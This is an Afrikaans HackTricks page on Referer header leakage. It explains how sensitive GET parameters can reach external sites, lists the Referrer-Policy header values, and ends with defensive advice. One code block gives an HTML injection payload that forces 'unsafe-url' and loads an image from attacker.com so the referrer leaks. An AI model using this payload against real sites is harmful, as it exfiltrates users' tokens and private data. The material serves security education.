{% hint style="success" %}
Leer en oefen AWS-hacking: <img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Leer en oefen GCP-hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Ondersteun HackTricks</summary>

* Controleer die [**inskrywingsplanne**](https://github.com/sponsors/carlospolop)!
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel hacking-truuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>
{% endhint %}


# Verwysingskoppe en beleid

Verwysing is die kop wat deur webblaaie gebruik word om aan te dui watter die vorige bladsy was wat besoek is.

## Sensitiewe inligting wat uitgelek is

Indien op enige oomblik binne 'n webbladsy enige sensitiewe inligting op 'n GET-versoekparameters geleë is, as die bladsy skakels na eksterne bronne bevat of 'n aanvaller in staat is om die gebruiker te laat 'n URL besoek wat deur die aanvaller beheer word. Dit kan in staat wees om die sensitiewe inligting binne die laaste GET-versoek uit te skakel.

## Versagting

Jy kan die blaaier laat 'n **Verwysingsbeleid** volg wat die sensitiewe inligting kan **vermy** om na ander webtoepassings gestuur te word:
```
Referrer-Policy: no-referrer
Referrer-Policy: no-referrer-when-downgrade
Referrer-Policy: origin
Referrer-Policy: origin-when-cross-origin
Referrer-Policy: same-origin
Referrer-Policy: strict-origin
Referrer-Policy: strict-origin-when-cross-origin
Referrer-Policy: unsafe-url
```
## Teenmaatreël

Jy kan hierdie reël oorskryf deur 'n HTML meta-tag te gebruik (die aanvaller moet 'n HTML-inspuiting uitbuit):
```markup
<meta name="referrer" content="unsafe-url">
<img src="https://attacker.com">
```
## Verdediging

Moenie enige sensitiewe data binne GET parameters of paaie in die URL plaas nie.
